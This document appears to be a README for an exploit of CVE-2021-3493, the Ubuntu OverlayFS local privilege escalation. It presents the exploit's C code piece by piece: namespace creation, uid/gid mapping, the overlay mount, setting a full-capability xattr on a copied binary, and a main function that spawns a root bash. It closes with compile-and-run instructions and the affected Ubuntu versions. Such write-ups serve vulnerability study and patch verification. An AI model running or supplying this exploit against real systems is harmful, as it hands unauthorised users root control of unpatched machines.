# CVE-2021-3493
Ubuntu OverlayFS Local Privesc

## Description

[- Ubuntu Security](https://ubuntu.com/security/CVE-2021-3493)

CVE-2021-3493 is a vulnerability affecting Ubuntu systems using OverlayFS. This vulnerability allows a local attacker to escalate privileges so as to gain root access to the system.

OverlayFS is a layered file system commonly used in container environments to overlay file systems. The specific vulnerability lies in the way OverlayFS handles certain interactions with user mapping in a non-shared namespace.

## Key Points

### Creation of Directory and File Structures:
The exploit starts by creating a set of directories (ovlcap, work, lower, upper, merge) on the file system. These directories are then used to configure OverlayFS.

```
#define DIR_BASE    "./ovlcap"
#define DIR_WORK    DIR_BASE "/work"
#define DIR_LOWER   DIR_BASE "/lower"
#define DIR_UPPER   DIR_BASE "/upper"
#define DIR_MERGE   DIR_BASE "/merge"
#define BIN_MERGE   DIR_MERGE "/magic"
#define BIN_UPPER   DIR_UPPER "/magic"
```
The directory and file paths to be used in the exploit are defined. For example, DIR_BASE is the parent directory, and BIN_UPPER is the path to the "magic" executable in the top directory.

```
// Function Calls
xmkdir(DIR_BASE, 0777);
xmkdir(DIR_WORK,  0777);
xmkdir(DIR_LOWER, 0777);
xmkdir(DIR_UPPER, 0777);
xmkdir(DIR_MERGE, 0777);
 ```

This function creates a directory at the specified path with the given permission mode. If the mkdir system call fails, and the error is not due to the directory already existing (EEXIST), an error is raised using the err function.

### Creation of a New Namespace:
The exploit uses the unshare system call to create a new namespace, including a new user space (CLONE_NEWUSER). This allows the attacker to work in a separate user space.

 ```
if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)
    err(1, "unshare");
 ```

### User and Group ID Mapping Configuration:
This function opens a file at the specified path for writing (O_WRONLY). If the opening fails, an error is raised. It then writes the specified data to the file, and if the write operation is not successful, an error is raised. Finally, the file descriptor is closed.
```
static void xwritefile(const char *path, const char *data)
{
    int fd = open(path, O_WRONLY);
    if (fd == -1)
        err(1, "open %s", path);
    ssize_t len = (ssize_t) strlen(data);
    if (write(fd, data, len) != len)
        err(1, "write %s", path);
    close(fd);
}
```
Within the new namespace, the exploit uses special files in /proc/self to perform a mapping of the user and group IDs. These mappings map the ID 0 (root) of the new namespace to the attacker's actual user and group ID.

```
xwritefile("/proc/self/setgroups", "deny");

char buf[4096];
sprintf(buf, "0 %d 1", uid);
xwritefile("/proc/self/uid_map", buf);

sprintf(buf, "0 %d 1", gid);
xwritefile("/proc/self/gid_map", buf);
 ```

### OverlayFS mount:
An OverlayFS file system is mounted using the previously created directories (lower, upper, work) with the mount system call. This creates an overlay of file system layers.

 ```
sprintf(buf, "lowerdir=%s,upperdir=%s,workdir=%s", DIR_LOWER, DIR_UPPER, DIR_WORK);
if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1)
    err(1, "mount %s", DIR_MERGE);
 ```

### Executable Copying and Extended Attribute Manipulation:

```
static void xcopyfile(const char *src, const char *dst, mode_t mode)
{
    int fi, fo;

    if ((fi = open(src, O_RDONLY)) == -1)
        err(1, "open %s", src);
    if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)
        err(1, "open %s", dst);

    char buf[4096];
    ssize_t rd, wr;

    for (;;) {
        rd = read(fi, buf, sizeof(buf));
        if (rd == 0) {
            break;
        } else if (rd == -1) {
            if (errno == EINTR)
                continue;
            err(1, "read %s", src);
        }

        char *p = buf;
        while (rd > 0) {
            wr = write(fo, p, rd);
            if (wr == -1) {
                if (errno == EINTR)
                    continue;
                err(1, "write %s", dst);
            }
            p += wr;
            rd -= wr;
        }
    }

    close(fi);
    close(fo);
}

```
This function copies a file from the source (src) to the destination (dst) with the specified permission mode. It opens the source file for reading (O_RDONLY) and the destination file for writing or creates it if it doesn't exist (O_WRONLY | O_CREAT). If there are errors during the file operations, errors are raised. The function reads the content of the source file in blocks and writes them to the destination file. It handles interruptions during reading or writing. Finally, it closes the file descriptors.



The exploit copies the current executable (/proc/self/exe) to the merge directory (merge). It then sets an extended attribute (security.capability) on the copied executable, thus disabling certain kernel protections.

```
xcopyfile("/proc/self/exe", BIN_MERGE, 0777);

char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";
if (setxattr(BIN_MERGE, "security.capability", cap, sizeof(cap) - 1, 0) == -1)
    err(1, "setxattr %s", BIN_MERGE);

```

### Main Function (main)
```
int main(int argc, char *argv[])
{
    if (strstr(argv[0], "magic") || (argc > 1 && !strcmp(argv[1], "shell"))) {
        setuid(0);
        setgid(0);
        execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);
        err(1, "execl /bin/bash");
    }

    pid_t child = fork();
    if (child == -1)
        err(1, "fork");

    if (child == 0) {
        _exit(exploit());
    } else {
        waitpid(child, NULL, 0);
    }

    execl(BIN_UPPER, BIN_UPPER, "shell", NULL);
    err(1, "execl %s", BIN_UPPER);
}

```
This main function performs several actions, depending on the arguments passed to the program:

Execution of the "magic" Binary or "shell" Argument.

Checks whether the program is running as the magic binary (strstr(argv[0], "magic")) or if the "shell" argument is passed (!strcmp(argv[1], "shell")).

If any of the above conditions are met, the user and group identifiers are changed to 0 (root) using setuid(0) and setgid(0).

Then, a new instance of the Bash shell is executed with certain options (execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL)). If the execution fails, an error is generated.

Creation of a Child Process and Execution of the Exploit Function

A child process is created using fork. If the creation of the process fails, an error is generated.

In the child process (child == 0), it exits immediately after executing the exploit function (_exit(exploit())).

In the parent process, it waits for the child process to terminate using waitpid(child, NULL, 0).

Execution of the Shell in the Upper Directory (BIN_UPPER)

Finally, another instance of the shell is executed in a specific directory (execl(BIN_UPPER, BIN_UPPER, "shell", NULL)). If the execution fails, an error is generated.
This design allows the program to be executed in two different ways:

- As the "magic" binary, which leads to the execution of a shell with elevated privileges.
- As a normal program, which triggers the exploit process in a new namespace, followed by the execution of a shell in the top directory.

###  Execution of the Exploit:
Finally, the exploit performs some additional actions and then executes the copied executable. This allows the attacker to execute code with root privileges in the new namespace, exploiting the OverlayFS vulnerability to escalate privileges.

## Affected Versions

- Ubuntu 20.10
- Ubuntu 20.04 LTS
- Ubuntu 19.04
- Ubuntu 18.04 LTS
- Ubuntu 16.04 LTS
- Ubuntu 14.04 ESM

Fixed in Linux 5.11

## Usage

- ```gcc exploit.c -o exploit```
- ```./exploit```


## References
- https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/
- https://ubuntu.com/security/CVE-2021-3493
- https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=7c03e2cda4a584cadc398e8f6641ca9988a39d52
- https://www.openwall.com/lists/oss-security/2021/04/16/1







